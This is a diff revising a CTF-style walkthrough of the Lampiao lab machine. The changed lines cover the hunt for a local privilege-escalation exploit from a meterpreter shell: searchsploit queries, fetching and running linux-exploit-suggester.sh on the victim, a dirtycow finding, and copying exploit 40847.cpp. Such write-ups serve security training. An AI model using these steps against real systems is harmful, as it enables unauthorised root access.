@@ -126,30 +126,16 @@ meterpreter >
     lampiao:/var/www/html$ uname -a
     Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux
 
-Back on my machine to research a nice exploit, i've try:
+Back on my machine to search a nice exploit, i've try many query with searchsploit:
 
     $ searchsploit linux 4.4
 
-```txt
-43418.c
-39166.c
-37292.c
-42276.c
-37088.c
-9542.c
-41458.c
-39277.c
-40003.c
-44298.c
-44300.c
-```
-
-After a few hours to test no working exploit, i've test an another query on exploitdb:
+No working exploit found...
 
     $ searchsploit Linux Kernel | grep local | wc -l
     200
 
-Try to reduce the list, only `.c` and `.cpp` exploit.
+Try to reduce the list with only `.c` and `.cpp` exploit.
 
     $ searchsploit Linux Kernel | grep local | grep -e "\.cpp$" -e "\.c$" | wc -l
     151
@@ -159,15 +145,13 @@ We remove `x86_64` and `arm` exploit.
     $ searchsploit Linux Kernel linux/local | grep -e "\.cpp$" -e "\.c$" | wc -l
     126
 
-The list is again huge... after some times, the exploit `40847.cpp` has work...
-
-We can still lower the result with `linux-exploit-suggester.sh`, on the victim:
+`126` result to test manually? no way, we going to use `linux-exploit-suggester.sh`, on the victim:
 
     $ wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
     $ chmod +x les.sh
     $ ./les.sh
 
-The script found 17 exploits.
+Finally, The script found 17 exploits.
 
 ```txt
 [+] [CVE-2016-5195] dirtycow 2
@@ -179,7 +163,7 @@ The script found 17 exploits.
    Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
 ```
 
-Yep, an exploit for `kernel 2.6.2 < 3.9` has work on a `kernel 4.4.0`.  
+Copy the script in your current directory.
 
     $ searchsploit 40847
     $ cp /usr/share/exploitdb/exploits/linux/local/40847.cpp ./
